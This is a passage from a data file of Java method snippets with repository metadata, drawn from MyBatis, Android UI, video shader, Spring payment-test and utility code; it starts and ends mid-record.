"https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ObjectTypeHandler.java", "stars": "15", "class": {"name": "ObjectTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getNullableResult(CallableStatement cs, int columnIndex)      throws SQLException {    return cs.getObject(columnIndex);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ObjectTypeHandler.java", "stars": "15", "class": {"name": "ObjectTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "buildUUIDWithoutDash", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String buildUUIDWithoutDash() {        return StringUtils.remove(UUID.randomUUID().toString(), \"-\");    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/util/BeyondUtil.java", "stars": "1", "class": {"name": "BeyondUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_new);        textViewMessageReceived = findViewById(R.id.textview_message);        editTextAnswer = findViewById(R.id.edittext_answer);        Intent intent = getIntent();        if(intent.hasExtra(MainActivity.EXTRA_ID)) {            String messageReceived = intent.getStringExtra(MainActivity.EXTRA_ID);            textViewMessageReceived.setText(messageReceived);        } else {            textViewMessageReceived.setText(\"N\u00e3o h\u00e1 mensagens.\");        }    }", "url": "https://raw.githubusercontent.com/pjmatuck/dev.venture/master/FakeMessenger/app/src/main/java/learn/java/fakemessenger/NewActivity.java", "stars": "2", "class": {"name": "NewActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "sendAnswer", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendAnswer(View view){        String answer = editTextAnswer.getText().toString();        Intent answerIntent = new Intent();        answerIntent.putExtra(ANSWER_ID, answer);        setResult(RESULT_OK, answerIntent);        finish();    }", "url": "https://raw.githubusercontent.com/pjmatuck/dev.venture/master/FakeMessenger/app/src/main/java/learn/java/fakemessenger/NewActivity.java", "stars": "2", "class": {"name": "NewActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getBody() {    return body;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBody", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setBody(String body) {    this.body = body;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getId() {    return id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(int id) {    this.id = id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSubject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSubject() {    return subject;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSubject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSubject(String subject) {    this.subject = subject;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTags", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<AnnoPostTag>", "snippet": "  public List<AnnoPostTag> getTags() {    return tags;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTags", "params": ["List<AnnoPostTag>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setTags(List<AnnoPostTag> tags) {    this.tags = tags;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/manyanno/AnnoPost.java", "stars": "15", "class": {"name": "AnnoPost", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRequestCount", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getRequestCount() {    return requestCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAverageRequestTime", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getAverageRequestTime() {    return requestCount == 0 ? 0 : accumulatedRequestTime / requestCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAverageWaitTime", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getAverageWaitTime() {    return hadToWaitCount == 0 ? 0 : accumulatedWaitTime / hadToWaitCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHadToWaitCount", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getHadToWaitCount() {    return hadToWaitCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBadConnectionCount", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getBadConnectionCount() {    return badConnectionCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getClaimedOverdueConnectionCount", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getClaimedOverdueConnectionCount() {    return claimedOverdueConnectionCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAverageOverdueCheckoutTime", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getAverageOverdueCheckoutTime() {    return claimedOverdueConnectionCount == 0 ? 0 : accumulatedCheckoutTimeOfOverdueConnections / claimedOverdueConnectionCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAverageCheckoutTime", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "  public synchronized long getAverageCheckoutTime() {    return requestCount == 0 ? 0 : accumulatedCheckoutTime / requestCount;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIdleConnectionCount", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "int", "snippet": "  public synchronized int getIdleConnectionCount() {    return idleConnections.size();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getActiveConnectionCount", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "int", "snippet": "  public synchronized int getActiveConnectionCount() {    return activeConnections.size();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "String", "snippet": "  public synchronized String toString() {    StringBuilder builder = new StringBuilder();    builder.append(\"\\n===CONFINGURATION==============================================\");    builder.append(\"\\n jdbcDriver                     \").append(dataSource.getDriver());    builder.append(\"\\n jdbcUrl                        \").append(dataSource.getUrl());    builder.append(\"\\n jdbcUsername                   \").append(dataSource.getUsername());    builder.append(\"\\n jdbcPassword                   \").append(dataSource.getPassword() == null ? \"NULL\" : \"************\");    builder.append(\"\\n poolMaxActiveConnections       \").append(dataSource.poolMaximumActiveConnections);    builder.append(\"\\n poolMaxIdleConnections         \").append(dataSource.poolMaximumIdleConnections);    builder.append(\"\\n poolMaxCheckoutTime            \").append(dataSource.poolMaximumCheckoutTime);    builder.append(\"\\n poolTimeToWait                 \").append(dataSource.poolTimeToWait);    builder.append(\"\\n poolPingEnabled                \").append(dataSource.poolPingEnabled);    builder.append(\"\\n poolPingQuery                  \").append(dataSource.poolPingQuery);    builder.append(\"\\n poolPingConnectionsNotUsedFor  \").append(dataSource.poolPingConnectionsNotUsedFor);    builder.append(\"\\n ---STATUS-----------------------------------------------------\");    builder.append(\"\\n activeConnections              \").append(getActiveConnectionCount());    builder.append(\"\\n idleConnections                \").append(getIdleConnectionCount());    builder.append(\"\\n requestCount                   \").append(getRequestCount());    builder.append(\"\\n averageRequestTime             \").append(getAverageRequestTime());    builder.append(\"\\n averageCheckoutTime            \").append(getAverageCheckoutTime());    builder.append(\"\\n claimedOverdue                 \").append(getClaimedOverdueConnectionCount());    builder.append(\"\\n averageOverdueCheckoutTime     \").append(getAverageOverdueCheckoutTime());    builder.append(\"\\n hadToWait                      \").append(getHadToWaitCount());    builder.append(\"\\n averageWaitTime                \").append(getAverageWaitTime());    builder.append(\"\\n badConnectionCount             \").append(getBadConnectionCount());    builder.append(\"\\n===============================================================\");    return builder.toString();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/pooled/PoolState.java", "stars": "15", "class": {"name": "PoolState", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getShader", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {        String shader =                \"#extension GL_OES_EGL_image_external : require\\n\"                        + \"precision mediump float;\\n\"                        + \"varying vec2 vTextureCoord;\\n\"                        + \"uniform samplerExternalOES sTexture;\\n\"                        + \"uniform sampler2D sTexture2;\\n\"                        + \"void main() {\\n\"                        + \"  vec4 c2 = texture2D(sTexture, vTextureCoord);\\n\"                        + \"  vec4 c1 = texture2D(sTexture2, vTextureCoord);\\n\"                        + \"  vec4 whiteColor = vec4(1.0);\\n\"                        + \"  gl_FragColor = whiteColor - (whiteColor - c2) / c1;\\n\"                        + \"}\\n\";        return shader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapEffect.java", "stars": "2", "class": {"name": "BitmapEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "setup", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {        MockitoAnnotations.initMocks(this);        final PaymentController paymentController = new PaymentController(paymentService, userService);        this.restPaymentMockMvc = MockMvcBuilders.standaloneSetup(paymentController)            .setCustomArgumentResolvers(pageableArgumentResolver)            .setControllerAdvice(exceptionTranslator)            .setConversionService(createFormattingConversionService())            .setMessageConverters(jacksonMessageConverter)            .setValidator(validator).build();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initTest() {        user = new User();        user.setLogin(DEFAULT_LOGIN);        user.setPassword(RandomStringUtils.random(60));        user.setActivated(true);        user.setEmail(RandomStringUtils.randomAlphabetic(5) + DEFAULT_EMAIL);        user.setFirstName(DEFAULT_FIRSTNAME);        user.setLastName(DEFAULT_LASTNAME);        user.setBankAccountIBAN(DEFAULT_IBAN);        user.setStripeAccountId(\"testId\");        userRepository.save(user);        userRepository.flush();        gardenField = new GardenField();        gardenField.setName(GARDEN_NAME);        gardenField.setSizeInM2(SIZE_IN_M2);        gardenField.setPricePerM2(PRICE_PER_M2);        gardenField.setLatitude(1.0);        gardenField.setLongitude(1.0);        gardenField.setCity(\"testcity\");        gardenField.setRoofed(ROOFED);        gardenField.setGlassHouse(GLASS_HOUSE);        gardenField.setHigh(HIGH);        gardenField.setWater(WATER);        gardenField.setElectricity(ELECTRICITY);        gardenField.setPhValue(PH_VALUE);        gardenField.setOwner(user);        gardenFieldRepository.save(gardenField);        gardenFieldRepository.flush();        leasing = new Leasing()            .from(DEFAULT_FROM)            .to(DEFAULT_TO)            .status(DEFAULT_STATUS)            .gardenField(gardenField)            .user(user).paymentSessionId(\"paymentSessionId\");        em.persist(leasing);        em.flush();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateCheckoutSession", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCheckoutSession() throws Exception {        leasingRepository.deleteAll();        leasingRepository.flush();        CreatorLeasingDTO creatorLeasingDTO = creatorLeasingMapper.toDto(leasing);        restPaymentMockMvc.perform(MockMvcRequestBuilders.post(\"/api/v1/payments/checkoutSession\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(creatorLeasingDTO)))            .andExpect(status().isCreated());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateCheckoutSessionShouldFailNotAuthorized", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCheckoutSessionShouldFailNotAuthorized() throws Exception {        leasingRepository.deleteAll();        leasingRepository.flush();        CreatorLeasingDTO creatorLeasingDTO = creatorLeasingMapper.toDto(leasing);        restPaymentMockMvc.perform(MockMvcRequestBuilders.post(\"/api/v1/payments/checkoutSession\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(creatorLeasingDTO)))            .andExpect(status().isInternalServerError());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateCheckoutSessionInvalidCreatorDTOShouldFail", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCheckoutSessionInvalidCreatorDTOShouldFail() throws Exception {        leasingRepository.deleteAll();        leasingRepository.flush();        CreatorLeasingDTO creatorLeasingDTO = creatorLeasingMapper.toDto(leasing);        creatorLeasingDTO.setTo(Instant.ofEpochMilli(0L));        creatorLeasingDTO.setFrom(creatorLeasingDTO.getTo().plus(2, ChronoUnit.DAYS));        restPaymentMockMvc.perform(MockMvcRequestBuilders.post(\"/api/v1/payments/checkoutSession\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(creatorLeasingDTO)))            .andExpect(status().isBadRequest())            .andDo(MockMvcResultHandlers.print());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateCheckoutSessionInvalidCreatorDTOShouldFailInvalidDate", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCheckoutSessionInvalidCreatorDTOShouldFailInvalidDate() throws Exception {        leasingRepository.deleteAll();        leasingRepository.flush();        CreatorLeasingDTO creatorLeasingDTO = creatorLeasingMapper.toDto(leasing);        creatorLeasingDTO.setTo(Instant.now().plus(2, ChronoUnit.DAYS));        creatorLeasingDTO.setFrom(Instant.now());        restPaymentMockMvc.perform(MockMvcRequestBuilders.post(\"/api/v1/payments/checkoutSession\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(creatorLeasingDTO)))            .andExpect(status().isBadRequest())            .andDo(MockMvcResultHandlers.print());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateCheckoutSessionInvalidCreatorDTOShouldFailDateInPast", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCheckoutSessionInvalidCreatorDTOShouldFailDateInPast() throws Exception {        leasingRepository.deleteAll();        leasingRepository.flush();        CreatorLeasingDTO creatorLeasingDTO = creatorLeasingMapper.toDto(leasing);        creatorLeasingDTO.setTo(Instant.now().minus(2, ChronoUnit.DAYS));        creatorLeasingDTO.setFrom(Instant.now());        restPaymentMockMvc.perform(MockMvcRequestBuilders.post(\"/api/v1/payments/checkoutSession\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(creatorLeasingDTO)))            .andExpect(status().isBadRequest())            .andDo(MockMvcResultHandlers.print());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateCheckoutSessionInvalidCreatorDTOShouldFailOverlaps", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCheckoutSessionInvalidCreatorDTOShouldFailOverlaps() throws Exception {        Leasing overlappingLesaing = new Leasing()            .from(DEFAULT_FROM)            .to(DEFAULT_TO.plus(10, ChronoUnit.DAYS))            .status(DEFAULT_STATUS)            .gardenField(gardenField)            .user(user).paymentSessionId(\"paymentSessionId\");        em.persist(overlappingLesaing);        em.flush();        CreatorLeasingDTO creatorLeasingDTO = creatorLeasingMapper.toDto(leasing);        restPaymentMockMvc.perform(MockMvcRequestBuilders.post(\"/api/v1/payments/checkoutSession\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(creatorLeasingDTO)))            .andExpect(status().isBadRequest())            .andDo(MockMvcResultHandlers.print());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetAccountLinkUrlShouldFailWithInvalidAccount", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetAccountLinkUrlShouldFailWithInvalidAccount() throws Exception {        restPaymentMockMvc.perform(get(\"/api/v1/payments/accountLinkUrl\"))            .andExpect(status().isInternalServerError());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetAccountLinkUrlWithUnauthorized", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetAccountLinkUrlWithUnauthorized() throws Exception {        CreatorLeasingDTO creatorLeasingDTO = creatorLeasingMapper.toDto(leasing);        creatorLeasingDTO.setUserId(-1L); //set to any invalid id        restPaymentMockMvc.perform(get(\"/api/v1/payments/accountLinkUrl\"))            .andExpect(status().isUnauthorized());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/PaymentControllerIT.java", "stars": "2", "class": {"name": "PaymentControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getId() {    return id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/heavy_initial_load/Thing.java", "stars": "15", "class": {"name": "Thing", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Long id) {    this.id = id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/heavy_initial_load/Thing.java", "stars": "15", "class": {"name": "Thing", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPullToRefreshScrollDirection", "params": [], "throws": null, "modifiers": ["public", "final"], "return_type": "Orientation", "snippet": "\tpublic final Orientation getPullToRefreshScrollDirection() {\t\treturn Orientation.VERTICAL;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshScrollView.java", "stars": "74", "class": {"name": "PullToRefreshScrollView", "extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "createRefreshableView", "params": ["Context", "AttributeSet"], "throws": null, "modifiers": ["protected"], "return_type": "ScrollView", "snippet": "\tprotected ScrollView createRefreshableView(Context context, AttributeSet attrs) {\t\tScrollView scrollView;\t\tif (VERSION.SDK_INT >= VERSION_CODES.GINGERBREAD) {\t\t\tscrollView = new InternalScrollViewSDK9(context, attrs);\t\t} else {\t\t\tscrollView = new ScrollView(context, attrs);\t\t}\t\tscrollView.setId(R.id.scrollview);\t\treturn scrollView;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshScrollView.java", "stars": "74", "class": {"name": "PullToRefreshScrollView", "extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "isReadyForPullStart", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isReadyForPullStart() {\t\treturn mRefreshableView.getScrollY() == 0;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshScrollView.java", "stars": "74", "class": {"name": "PullToRefreshScrollView", "extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "isReadyForPullEnd", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isReadyForPullEnd() {\t\tView scrollViewChild = mRefreshableView.getChildAt(0);\t\tif (null != scrollViewChild) {\t\t\treturn mRefreshableView.getScrollY() >= (scrollViewChild.getHeight() - getHeight());\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshScrollView.java", "stars": "74", "class": {"name": "PullToRefreshScrollView", "extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "overScrollBy", "params": ["int", "int", "int", "int", "int", "int", "int", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\t\tprotected boolean overScrollBy(int deltaX, int deltaY, int scrollX, int scrollY, int scrollRangeX,\t\t\t\tint scrollRangeY, int maxOverScrollX, int maxOverScrollY, boolean isTouchEvent) {\t\t\tfinal boolean returnValue = super.overScrollBy(deltaX, deltaY, scrollX, scrollY, scrollRangeX,\t\t\t\t\tscrollRangeY, maxOverScrollX, maxOverScrollY, isTouchEvent);\t\t\t// Does all of the hard work...\t\t\tOverscrollHelper.overScrollBy(PullToRefreshScrollView.this, deltaX, scrollX, deltaY, scrollY,\t\t\t\t\tgetScrollRange(), isTouchEvent);\t\t\treturn returnValue;\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshScrollView.java", "stars": "74", "class": {"name": "InternalScrollViewSDK9", "extends": "ScrollView", "implements": null, "modifiers": ["final"]}}, {"method_name": "getScrollRange", "params": [], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\t\tprivate int getScrollRange() {\t\t\tint scrollRange = 0;\t\t\tif (getChildCount() > 0) {\t\t\t\tView child = getChildAt(0);\t\t\t\tscrollRange = Math.max(0, child.getHeight() - (getHeight() - getPaddingBottom() - getPaddingTop()));\t\t\t}\t\t\treturn scrollRange;\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshScrollView.java", "stars": "74", "class": {"name": "InternalScrollViewSDK9", "extends": "ScrollView", "implements": null, "modifiers": ["final"]}}, {"method_name": "getPlatform", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Platform", "snippet": "    public Platform getPlatform() {        return platform;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/UpdatePackageRequest.java", "stars": "1", "class": {"name": "UpdatePackageRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPlatform", "params": ["Platform"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPlatform(Platform platform) {        this.platform = platform;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/UpdatePackageRequest.java", "stars": "1", "class": {"name": "UpdatePackageRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"UpdatePackageRequest{\" +                \"platform=\" + platform +                '}';    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/UpdatePackageRequest.java", "stars": "1", "class": {"name": "UpdatePackageRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hello", "params": ["File"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String hello(File input) throws Exception {\t\tFileInputStream in = new FileInputStream(input);\t\tString name = new String(StreamUtils.copyToByteArray(in));\t\tin.close();\t\treturn this.helloWorldService.getHelloMessage(name);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-parent-context/src/main/java/smoketest/parent/SampleEndpoint.java", "stars": "47572", "class": {"name": "SampleEndpoint", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "md5", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String md5(String inputString){    return encodeByMD5(inputString);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/MD5Utils.java", "stars": "18", "class": {"name": "MD5Utils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "authenticatePassword", 